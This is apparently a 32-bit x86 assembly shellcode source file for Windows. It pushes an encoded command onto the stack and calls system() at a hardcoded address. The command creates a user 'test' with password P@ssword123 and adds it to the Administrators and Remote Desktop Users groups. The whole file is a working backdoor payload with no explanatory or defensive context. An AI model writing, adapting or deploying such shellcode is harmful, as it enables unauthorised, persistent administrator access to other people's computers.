[BITS 32]

global _start			

section .text
_start:

    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack
    
    ; net user test P@ssword123 /add & net localgroup administrators test /add & net localgroup "Remote desktop users" test /add
    push 0x20206464
    push 0x612f2074
    push 0x73657420
    push 0x22737265
    push 0x73752070
    push 0x6f746b73
    push 0x65642065
    push 0x746f6d65
    push 0x52222070
    push 0x756f7267
    push 0x6c61636f
    push 0x6c207465
    push 0x6e202620
    push 0x6464612f
    push 0x20747365
    push 0x74207372
    push 0x6f746172
    push 0x7473696e
    push 0x696d6461
    push 0x2070756f
    push 0x72676c61
    push 0x636f6c20
    push 0x74656e20
    push 0x26206464
    push 0x612f2033
    push 0x32316472
    push 0x6f777373
    push 0x40502074
    push 0x73657420
    push 0x72657375
    push 0x2074656e

    mov ebx, esp	; save stack pointer 

    push ebx		; push pointer to add user command 
    mov edx, 0x77c293c7	; mov address of system
    call edx
